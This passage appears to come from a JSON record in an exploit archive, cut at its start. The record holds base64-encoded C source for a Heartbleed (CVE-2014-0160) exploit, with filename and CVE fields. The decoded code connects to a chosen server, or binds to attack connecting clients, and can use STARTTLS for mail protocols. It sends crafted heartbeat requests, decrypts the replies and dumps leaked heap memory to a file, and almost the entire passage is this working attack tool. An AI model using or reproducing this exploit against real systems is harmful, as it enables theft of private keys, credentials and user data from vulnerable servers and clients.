kIGxlbmd0aD0ldSByZXR1cm5lZFxuIixyci0+dHlwZSxyci0+bGVuZ3RoKTsNCgkJCQlzLT5wYWNrZXRfbGVuZ3RoPTA7DQoJCQkJYmFkcGFja2V0cysrOw0KCQkJCWlmKGJhZHBhY2tldHMgPiAzKXsNCgkJCQkJcHJpbnRmKCJbIGVycm9yOiB0b28gbWFueSBiYWQgcGFja2V0cyByZWNpZXZlZFxuIik7DQoJCQkJCWV4aXQoMCk7DQoJCQkJfQ0KCQkJCWdvdG8gYXBwbGU7DQoJCQl9DQogICAgICAgIH0NCiAgICAgICAgaWYgKHJyLT5sZW5ndGggPiBzLT5wYWNrZXRfbGVuZ3RoLVNTTDNfUlRfSEVBREVSX0xFTkdUSCl7DQogICAgICAgICAgICAgICAgaT1yci0+bGVuZ3RoOw0KICAgICAgICAgICAgICAgIG49c3NsM19yZWFkX24ocyxpLGksMSk7DQogICAgICAgICAgICAgICAgaWYgKG4gPD0gMCkgZ290byBhcHBsZTsgDQogICAgICAgIH0NCglwcmludGYoIlsgZGVjcnlwdGluZyBTU0wgcGFja2V0XG4iKTsNCiAgICAgICAgcy0+cnN0YXRlPVNTTF9TVF9SRUFEX0hFQURFUjsgDQogICAgICAgIHJyLT5pbnB1dD0gJihzLT5wYWNrZXRbU1NMM19SVF9IRUFERVJfTEVOR1RIXSk7DQogICAgICAgIHJyLT5kYXRhPXJyLT5pbnB1dDsNCiAgICAgICAgdGxzMV9lbmMocywwKTsNCiAgICAgICAgaWYoKHNlc3MgIT0gTlVMTCkgJiYNCiAgICAgICAgICAgIChzLT5lbmNfcmVhZF9jdHggIT0gTlVMTCkgJiYNCiAgICAgICAgICAgIChFVlBfTURfQ1RYX21kKHMtPnJlYWRfaGFzaCkgIT0gTlVMTCkpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHVuc2lnbmVkIGNoYXIgKm1hYyA9IE5VTEw7DQogICAgICAgICAgICAgICAgdW5zaWduZWQgY2hhciBtYWNfdG1wW0VWUF9NQVhfTURfU0laRV07DQogICAgICAgICAgICAgICAgbWFjX3NpemU9RVZQX01EX0NUWF9zaXplKHMtPnJlYWRfaGFzaCk7DQogICAgICAgICAgICAgICAgT1BFTlNTTF9hc3NlcnQobWFjX3NpemUgPD0gRVZQX01BWF9NRF9TSVpFKTsNCiAgICAgICAgICAgICAgICBvcmlnX2xlbiA9IHJyLT5sZW5ndGgrKCh1bnNpZ25lZCBpbnQpcnItPnR5cGU+PjgpOw0KICAgICAgICAgICAgICAgIGlmKG9yaWdfbGVuIDwgbWFjX3NpemUgfHwNCiAgICAgICAgICAgICAgICAgIChFVlBfQ0lQSEVSX0NUWF9tb2RlKHMtPmVuY19yZWFkX2N0eCkgPT0gRVZQX0NJUEhfQ0JDX01PREUgJiYNCiAgICAgICAgICAgICAgICAgICBvcmlnX2xlbiA8IG1hY19zaXplKzEpKXsNCiAgICAgICAgICAgICAgICAgICAgICAgIGFsPVNTTF9BRF9ERUNPREVfRVJST1I7DQogICAgICAgICAgICAgICAgICAgICAgICBTU0xlcnIoU1NMX0ZfU1NMM19HRVRfUkVDT1JELFNTTF9SX0xFTkdUSF9UT09fU0hPUlQpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBpZiAoRVZQX0NJUEhFUl9DVFhfbW9kZShzLT5lbmNfcmVhZF9jdHgpID09IEVWUF9DSVBIX0NCQ19NT0RFKXsNCiAgICAgICAgICAgICAgICAgICAgICAgIG1hYyA9IG1hY190bXA7DQogICAgICAgICAgICAgICAgICAgICAgICBzc2wzX2NiY19jb3B5X21hYyhtYWNfdG1wLCByciwgbWFjX3NpemUsIG9yaWdfbGVuKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIHJyLT5sZW5ndGggLT0gbWFjX3NpemU7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGVsc2V7DQogICAgICAgICAgICAgICAgICAgICAgICByci0+bGVuZ3RoIC09IG1hY19zaXplOw0KICAgICAgICAgICAgICAgICAgICAgICAgbWFjID0gJnJyLT5kYXRhW3JyLT5sZW5ndGhdOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBpID0gdGxzMV9tYWMocyxtZCwwKTsNCiAgICAgICAgICAgICAgICBpZiAoaSA8IDAgfHwgbWFjID09IE5VTEwgfHwgQ1JZUFRPX21lbWNtcChtZCwgbWFjLCAoc2l6ZV90KW1hY19zaXplKSAhPSAwKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZW5jX2VyciA9IC0xOw0KICAgICAgICAgICAgICAgIGlmIChyci0+bGVuZ3RoID4gU1NMM19SVF9NQVhfQ09NUFJFU1NFRF9MRU5HVEgrZXh0cmErbWFjX3NpemUpDQogICAgICAgICAgICAgICAgICAgICAgICBlbmNfZXJyID0gLTE7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICBpZihlbmNfZXJyIDwgMCl7DQogICAgICAgICAgICAgICAgYWw9U1NMX0FEX0JBRF9SRUNPUkRfTUFDOw0KICAgICAgICAgICAgICAgIFNTTGVycihTU0xfRl9TU0wzX0dFVF9SRUNPUkQsU1NMX1JfREVDUllQVElPTl9GQUlMRURfT1JfQkFEX1JFQ09SRF9NQUMpOw0KICAgICAgICAgICAgICAgIGdvdG8gYXBwbGU7DQogICAgICAgIH0NCiAgICAgICAgaWYocy0+ZXhwYW5kICE9IE5VTEwpew0KICAgICAgICAgICAgICAgIGlmIChyci0+bGVuZ3RoID4gU1NMM19SVF9NQVhfQ09NUFJFU1NFRF9MRU5HVEgrZXh0cmEpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGFsPVNTTF9BRF9SRUNPUkRfT1ZFUkZMT1c7DQogICAgICAgICAgICAgICAgICAgICAgICBTU0xlcnIoU1NMX0ZfU1NMM19HRVRfUkVDT1JELFNTTF9SX0NPTVBSRVNTRURfTEVOR1RIX1RPT19MT05HKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGdvdG8gYXBwbGU7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgaWYgKCFzc2wzX2RvX3VuY29tcHJlc3MocykpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGFsPVNTTF9BRF9ERUNPTVBSRVNTSU9OX0ZBSUxVUkU7DQogICAgICAgICAgICAgICAgICAgICAgICBTU0xlcnIoU1NMX0ZfU1NMM19HRVRfUkVDT1JELFNTTF9SX0JBRF9ERUNPTVBSRVNTSU9OKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGdvdG8gYXBwbGU7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICBpZiAocnItPmxlbmd0aCA+IFNTTDNfUlRfTUFYX1BMQUlOX0xFTkdUSCtleHRyYSkgew0KICAgICAgICAgICAgICAgIGFsPVNTTF9BRF9SRUNPUkRfT1ZFUkZMT1c7DQogICAgICAgICAgICAgICAgU1NMZXJyKFNTTF9GX1NTTDNfR0VUX1JFQ09SRCxTU0xfUl9EQVRBX0xFTkdUSF9UT09fTE9ORyk7DQogICAgICAgICAgICAgICAgZ290byBhcHBsZTsNCiAgICAgICAgfQ0KICAgICAgICByci0+b2ZmPTA7DQogICAgICAgIHMtPnBhY2tldF9sZW5ndGg9MDsNCglpZihmaXJzdD09MCl7DQoJCXVpbnQgaGVhcnRibGVlZF9sZW4gPSAwOw0KCQljaGFyKiBmcCA9IHMtPnMzLT5ycmVjLmRhdGE7DQoJCShsb25nKWZwKys7DQoJCW1lbWNweSgmaGVhcnRibGVlZF9sZW4sZnAsMik7DQoJCWhlYXJ0YmxlZWRfbGVuID0gKGhlYXJ0YmxlZWRfbGVuICYgMHhmZikgPDwgOCB8IChoZWFydGJsZWVkX2xlbiAmIDB4ZmYwMCkgPj4gODsNCgkJZmlyc3QgPSAyOw0KCQlsZWFrYnl0ZXMgPSBoZWFydGJsZWVkX2xlbiArIDE2Ow0KCQlwcmludGYoIlsgaGVhcnRibGVlZCBsZWFrZWQgbGVuZ3RoPSV1XG4iLGhlYXJ0YmxlZWRfbGVuKTsNCgl9DQoJaWYodmVyYm9zZT09MSl7DQoJCXsgdW5zaWduZWQgaW50IHo7IGZvciAoej0wOyB6PHJyLT5sZW5ndGg7IHorKykgcHJpbnRmKCIlMDJYJWMiLHJyLT5kYXRhW3pdLCgoeisxKSUxNik/JyAnOidcbicpOyB9DQogICAgICAgICAgICAgICAgcHJpbnRmKCJcbiIpOw0KICAgICAgICB9DQoJbGVha2J5dGVzLT1yci0+bGVuZ3RoOw0KCWlmKGxlYWtieXRlcyA+IDApew0KCQlyZXBlYXQgPSAxOw0KCX0NCgllbHNlew0KCQlyZXBlYXQgPSAwOw0KCX0NCglwcmludGYoIlsgZmluYWwgcmVjb3JkIHR5cGU9JWQsIGxlbmd0aD0ldVxuIiwgcnItPnR5cGUsIHJyLT5sZW5ndGgpOw0KCWludCBvdXRwdXQgPSBzLT5zMy0+cnJlYy5sZW5ndGgtMzsNCglpZihvdXRwdXQgPiAwKXsNCgkJaW50IGZkID0gb3BlbihmaWxlbmFtZSxPX1JEV1J8T19DUkVBVHxPX0FQUEVORCwwNzAwKTsNCgkgICAgICAgIGlmKGZpcnN0PT0yKXsNCgkJCWZpcnN0LS07DQoJCQl3cml0ZShmZCxzLT5zMy0+cnJlYy5kYXRhKzMscy0+czMtPnJyZWMubGVuZ3RoKTsNCgkJCS8qIGZpcnN0IHRocmVlIGJ5dGVzIGFyZSByZXNwK2xlbiAqLw0KCQkJcHJpbnRmKCJbIHdyb3RlICVkIGJ5dGVzIG9mIGhlYXAgdG8gZmlsZSAnJXMnXG4iLHMtPnMzLT5ycmVjLmxlbmd0aC0zLGZpbGVuYW1lKTsNCgkJfQ0KCQllbHNlew0KCQkJLyogaGVhcCBkYXRhICYgMTYgYnl0ZXMgcGFkZGluZyAqLw0KCQkJd3JpdGUoZmQscy0+czMtPnJyZWMuZGF0YSszLHMtPnMzLT5ycmVjLmxlbmd0aCk7DQoJCQlwcmludGYoIlsgd3JvdGUgJWQgYnl0ZXMgb2YgaGVhcCB0byBmaWxlICclcydcbiIscy0+czMtPnJyZWMubGVuZ3RoLGZpbGVuYW1lKTsNCgkJfQ0KCQljbG9zZShmZCk7DQoJfQ0KCWVsc2V7DQoJCXByaW50ZigiWyBub3RoaW5nIGZyb20gdGhlIGhlYXAgdG8gd3JpdGVcbiIpOw0KCX0NCglyZXR1cm47DQphcHBsZToNCiAgICAgICAgcHJpbnRmKCJbIHByb2JsZW0gaGFuZGxpbmcgU1NMIHJlY29yZCBwYWNrZXQgLSB3cm9uZyB0eXBlP1xuIik7DQoJYmFkcGFja2V0cysrOw0KCWlmKGJhZHBhY2tldHMgPiAzKXsNCgkJcHJpbnRmKCJbIGVycm9yOiB0b28gbWFueSBiYWQgcGFja2V0cyByZWNpZXZlZFxuIik7DQoJCWV4aXQoMCk7DQoJfQ0KCXJldHVybjsNCn0NCg0Kdm9pZCB1c2FnZSgpew0KCXByaW50ZigiW1xuIik7DQoJcHJpbnRmKCJbIC0tc2VydmVyfC1zIDxpcC9kbnM+ICAgIC0gdGhlIHNlcnZlciB0byB0YXJnZXRcbiIpOw0KCXByaW50ZigiWyAtLXBvcnR8LXAgICA8cG9ydD4gICAgICAtIHRoZSBwb3J0IHRvIHRhcmdldFxuIik7DQoJcHJpbnRmKCJbIC0tZmlsZXwtZiAgIDxmaWxlbmFtZT4gIC0gZmlsZSB0byB3cml0ZSBkYXRhIHRvXG4iKTsNCglwcmludGYoIlsgLS1iaW5kfC1iICAgPGlwPiAgICAgICAgLSBiaW5kIHRvIGlwIGZvciBleHBsb2l0aW5nIGNsaWVudHNcbiIpOw0KCXByaW50ZigiWyAtLXByZWNtZHwtYyA8bj4gICAgICAgICAtIHNlbmQgcHJlY21kIGJ1ZmZlciAoU1RBUlRUTFMpXG4iKTsNCglwcmludGYoIlsJCQkgICAgMCA9IFNNVFBcbiIpOw0KCXByaW50ZigiWwkJCSAgICAxID0gUE9QM1xuIik7DQoJcHJpbnRmKCJbCQkJICAgIDIgPSBJTUFQXG4iKTsNCglwcmludGYoIlsgLS1sb29wfC1sCQkgIC0gbG9vcCB0aGUgZXhwbG9pdCBhdHRlbXB0c1xuIik7DQoJcHJpbnRmKCJbIC0tdHlwZXwtdCAgIDxuPiAgICAgICAgIC0gc2VsZWN0IGV4cGxvaXQgdG8gdHJ5XG4iKTsNCglwcmludGYoIlsgICAgICAgICAgICAgICAgICAgICAgICAgICAwID0gbnVsbCBsZW5ndGhcbiIpOw0KCXByaW50ZigiWwkJCSAgICAxID0gbWF4IGxlYWtcbiIpOw0KCXByaW50ZigiWwkJCSAgICBuID0gaGVhcnRiZWF0IHBheWxvYWRfbGVuZ3RoXG4iKTsNCglwcmludGYoIltcbiIpOw0KCXByaW50ZigiWyAtLXZlcmJvc2V8LXYgICAgICAgICAgICAtIG91dHB1dCBsZWFrIHRvIHNjcmVlblxuIik7DQoJcHJpbnRmKCJbIC0taGVscHwtaCAgICAgICAgICAgICAgIC0gdGhpcyBvdXRwdXRcbiIpOw0KCXByaW50ZigiW1xuIik7DQoJZXhpdCgwKTsNCn0NCg0KaW50IG1haW4oaW50IGFyZ2MsIGNoYXIqIGFyZ3ZbXSl7DQoJaW50IHJldCwgcG9ydCwgdXNlcmMsIGluZGV4Ow0KCWludCB0eXBlID0gMSwgdWRwID0gMCwgdmVyYm9zZSA9IDAsIGJpbmQgPSAwLCBwcmVjbWQgPSA5Ow0KCWludCBsb29wID0gMDsNCglzdHJ1Y3QgaG9zdGVudCAqaDsNCgljb25uZWN0aW9uKiBjOw0KCWNoYXIgKmhvc3QsICpmaWxlOw0KCWludCBpaG9zdCA9IDAsIGlwb3J0ID0gMCwgaWZpbGUgPSAwLCBpdHlwZSA9IDAsIGlwcmVjbWQgPSAwOw0KCXByaW50ZigiWyBoZWFydGJsZWVkIC0gQ1ZFLTIwMTQtMDE2MCAtIE9wZW5TU0wgaW5mb3JtYXRpb24gbGVhayBleHBsb2l0XG4iKTsNCglwcmludGYoIlsgPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PVxuIik7DQogICAgICAgIHN0YXRpYyBzdHJ1Y3Qgb3B0aW9uIG9wdGlvbnNbXSA9IHsNCiAgICAgICAgCXsic2VydmVyIiwgMSwgMCwgJ3MnfSwNCgkgICAgICAgIHsicG9ydCIsIDEsIDAsICdwJ30sDQoJCXsiZmlsZSIsIDEsIDAsICdmJ30sDQoJCXsidHlwZSIsIDEsIDAsICd0J30sDQoJCXsiYmluZCIsIDEsIDAsICdiJ30sDQoJCXsidmVyYm9zZSIsIDAsIDAsICd2J30sDQoJCXsicHJlY21kIiwgMSwgMCwgJ2MnfSwNCgkJeyJsb29wIiwgMCwgMCwgJ2wnfSwNCgkJeyJoZWxwIiwgMCwgMCwnaCd9DQogICAgICAgIH07DQoJd2hpbGUodXNlcmMgIT0gLTEpIHsNCgkgICAgICAgIHVzZXJjID0gZ2V0b3B0X2xvbmcoYXJnYyxhcmd2LCJzOnA6Zjp0OmI6YzpsdmgiLG9wdGlvbnMsJmluZGV4KTsJDQogICAgICAgIAlzd2l0Y2godXNlcmMpIHsNCiAgICAgICAgICAgICAgIAkJY2FzZSAtMToNCgkgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgCSAgICAgICAgY2FzZSAncyc6DQoJCQkJaWYoaWhvc3Q9PTApew0KCQkJCQlpaG9zdCA9IDE7DQoJCQkJCWggPSBnZXRob3N0YnluYW1lKG9wdGFyZyk7CQkJCQ0KCQkJCQlpZihoPT1OVUxMKXsNCgkJCQkJCXByaW50ZigiWyFdIEZBVEFMOiB1bmtub3duIGhvc3QgJyVzJ1xuIixvcHRhcmcpOw0KCQkJCQkJZXhpdCgxKTsNCgkJCQkJfQ0KCQkJCQlob3N0ID0gbWFsbG9jKHN0cmxlbihvcHRhcmcpICsgMSk7DQoJCQkJCWlmKGhvc3Q9PU5VTEwpew0KICAgICAgICAgICAgICAgIAkJCQlwcmludGYoIlsgZXJyb3IgaW4gbWFsbG9jKClcbiIpOw0KCQkJCSAgICAgICAgICAgICAgICBleGl0KDApOw0KICAgICAgICAJCQkJfQ0KCQkJCQlzcHJpbnRmKGhvc3QsIiVzIixvcHRhcmcpOw0KICAgICAgICAgICAgICAgCQkJfQ0KCQkJCWJyZWFrOw0KCSAgICAgICAgICAgICAgICBjYXNlICdwJzoNCgkJCQlpZihpcG9ydD09MCl7DQoJCQkJCXBvcnQgPSBhdG9pKG9wdGFyZyk7DQoJCQkJCWlwb3J0ID0gMTsNCgkJCQl9DQogICAgICAgICAgICAgICAgCSAgICAgICAgYnJlYWs7DQoJCQljYXNlICdmJzoNCgkJCQlpZihpZmlsZT09MCl7DQoJCQkJCWZpbGUgPSBtYWxsb2Moc3RybGVuKG9wdGFyZykgKyAxKTsNCgkJCQkJaWYoZmlsZT09TlVMTCl7DQoJCQkJICAgICAgICAgICAgICAgIHByaW50ZigiWyBlcnJvciBpbiBtYWxsb2MoKVxuIik7DQogICAgICAgICAgICAgICAgCQkJCWV4aXQoMCk7DQogICAgICAgIAkJCQl9DQoJCQkJCXNwcmludGYoZmlsZSwiJXMiLG9wdGFyZyk7DQoJCQkJCWlmaWxlID0gMTsNCgkJCQl9DQoJCQkJYnJlYWs7DQoJCQljYXNlICd0JzoNCgkJCQlpZihpdHlwZT09MCl7DQoJCQkJCXR5cGUgPSBhdG9pKG9wdGFyZyk7DQoJCQkJCWl0eXBlID0gMTsNCgkJCQl9DQoJCQkJYnJlYWs7DQoJCQljYXNlICdoJzoNCgkJCQl1c2FnZSgpOw0KCQkJCWJyZWFrOw0KCQkJY2FzZSAnYic6DQoJCQkJaWYoaWhvc3Q9PTApew0KCQkJCQlpaG9zdCA9IDE7DQoJCQkJCWhvc3QgPSBtYWxsb2Moc3RybGVuKG9wdGFyZykrMSk7DQoJCQkJCWlmKGhvc3Q9PU5VTEwpew0KCQkJIAkgICAgICAgICAgICAgICAgcHJpbnRmKCJbIGVycm9yIGluIG1hbGxvYygpXG4iKTsNCgkJCQkgICAgICAgICAgICAgICAgZXhpdCgwKTsNCgkJCQkgICAgICAgIH0NCgkJCQkJc3ByaW50Zihob3N0LCIlcyIsb3B0YXJnKTsNCgkJCQkJYmluZCA9IDE7DQoJCQkJfQ0KCQkJCWJyZWFrOw0KCQkJY2FzZSAnYyc6DQoJCQkJaWYoaXByZWNtZCA9PSAwKXsNCgkJCQkJaXByZWNtZCA9IDE7DQoJCQkJCXByZWNtZCA9IGF0b2kob3B0YXJnKTsNCgkJCQl9DQoJCQkJYnJlYWs7DQoJCQljYXNlICd2JzoNCgkJCQl2ZXJib3NlID0gMTsNCgkJCQlicmVhazsNCgkJCWNhc2UgJ2wnOg0KCQkJCWxvb3AgPSAxOw0KCQkJCWJyZWFrOw0KCQkJZGVmYXVsdDoNCgkJCQlicmVhazsNCgkJfQ0KCX0NCglpZihpaG9zdD09MHx8aXBvcnQ9PTB8fGlmaWxlPT0wfHxpdHlwZT09MHx8dHlwZSA8IDApew0KCQlwcmludGYoIlsgdHJ5IC0taGVscFxuIik7DQoJCWV4aXQoMCk7DQoJfQ0KCXNzbF9pbml0KCk7DQoJaWYoYmluZD09MCl7DQoJCXJldCA9IHRjcF9jb25uZWN0KGhvc3QsIHBvcnQpOw0KCQlwcmVfY21kKHJldCwgcHJlY21kLCB2ZXJib3NlKTsNCgkJYyA9IHRsc19jb25uZWN0KHJldCk7DQoJCWhlYXJ0YmxlZWQoYyx0eXBlKTsNCgkJd2hpbGUocmVwZWF0PT0xKXsNCgkJCXNuZWFreWxlYWt5KGMsZmlsZSx2ZXJib3NlKTsNCgkJfQ0KCQl3aGlsZShsb29wPT0xKXsNCgkJCXByaW50ZigiWyBlbnRlcmVkIGhlYXJ0YmxlZWQgbG9vcFxuIik7DQoJCQlmaXJzdD0wOw0KCQkJcmVwZWF0PTE7DQoJCQloZWFydGJsZWVkKGMsdHlwZSk7DQoJCQl3aGlsZShyZXBlYXQ9PTEpew0KCQkJCXNuZWFreWxlYWt5KGMsZmlsZSx2ZXJib3NlKTsNCgkJCX0NCgkJfQ0KCQlwcmludGYoIlsgZG9uZS5cbiIpOw0KCQlleGl0KDApOw0KCX0NCgllbHNlew0KCQlpbnQgc2QsIHBpZCwgaTsNCgkJcmV0ID0gdGNwX2JpbmQoaG9zdCwgcG9ydCk7DQoJCXdoaWxlKDEpew0KICAgICAgCQkJc2Q9YWNjZXB0KHJldCwwLDApOw0KCQkJaWYoc2Q9PS0xKXsNCgkJCQlwcmludGYoIlshXSBGQVRBTDogcHJvYmxlbSB3aXRoIGFjY2VwdCgpXG4iKTsNCgkJCQlleGl0KDApOw0KCQkJfQ0KCQkJaWYocGlkPWZvcmsoKSl7DQoJCQkJY2xvc2Uoc2QpOw0KCQkJfQ0KICAgICAgCQkJZWxzZXsNCgkJCQljID0gdGxzX2JpbmQoc2QpOw0KCQkJCXByZV9jbWQocmV0LCBwcmVjbWQsIHZlcmJvc2UpOw0KCQkJCWhlYXJ0YmxlZWQoYyx0eXBlKTsNCgkJCQl3aGlsZShyZXBlYXQ9PTEpew0KCQkJCQlzbmVha3lsZWFreShjLGZpbGUsdmVyYm9zZSk7DQoJCQkJfQ0KCQkJCXdoaWxlKGxvb3A9PTEpew0KCQkJCQlwcmludGYoIlsgZW50ZXJlZCBoZWFydGJsZWVkIGxvb3BcbiIpOw0KCQkJCQlmaXJzdD0wOw0KCQkJCQlyZXBlYXQ9MDsNCgkJCQkJaGVhcnRibGVlZChjLHR5cGUpOw0KCQkJCQl3aGlsZShyZXBlYXQ9PTEpew0KCQkJCQkJc25lYWt5bGVha3koYyxmaWxlLHZlcmJvc2UpOw0KCQkJCQl9DQoJCQkJfQ0KCQkJCXByaW50ZigiWyBkb25lLlxuIik7DQoJCQkJZXhpdCgwKTsNCgkJCX0NCgkJfQ0KCX0NCn0=", 
    "filename": "platforms/multiple/remote/32791.c", 
    "id": "32791", 
    "cves": [
        "CVE-2014-0160"
    ]
}